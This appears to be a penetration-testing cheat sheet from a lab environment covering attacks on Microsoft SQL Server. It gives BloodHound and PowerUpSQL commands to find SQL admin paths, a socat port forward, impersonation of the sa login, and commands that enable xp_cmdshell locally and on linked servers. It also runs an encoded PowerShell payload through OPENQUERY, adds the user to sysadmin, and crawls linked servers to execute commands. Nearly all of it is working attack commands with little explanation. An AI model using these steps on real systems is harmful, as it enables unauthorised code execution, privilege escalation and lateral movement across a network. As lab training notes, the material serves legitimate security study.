## BloodHound
``` a
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

``` powershell
PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
proxychains socat TCP4-Listen:1433,fork TCP:192.168.2.11:1433
runas /netonly /user:US.FUNCORP.LOCAL\pastudent34 "C:\Program Files\HeidiSQL\heidisql.exe" 
```
## xp_cmdshell
``` sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
```
## database link
``` sql
SELECT * FROM master..sysservers or EXEC sp_linkedservers;
```
## enum
``` sql
SELECT name FROM master.sys.databases
SELECT name FROM sys.syslogins
SELECT name FROM sys.server_principals
```

``` sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT @@servername
```

## enable xp_cmdshell 
``` sql
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE
```

# Remote 
``` sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [remote sql]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [remote sql]
SELECT * FROM OPENQUERY("[remote sql]", 'select * from sys.configurations where name = ''xp_cmdshell''')
```

``` sql
SELECT * FROM OPENQUERY("[remote sql]", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')
```
# INTO MSSQL
``` powershell
Get-SQLInstanceLocal
Get-SQLServerInfo -Verbose -Instance MSSQLSRV04\BOSCHSQL
```
``` batch
shell addselftosqlsysadmin.cmd MSSQLSERVER USFUN\pastudent34
```
* https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/

``` powershell
Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "exec master..xp_cmdshell 'whoami'"
```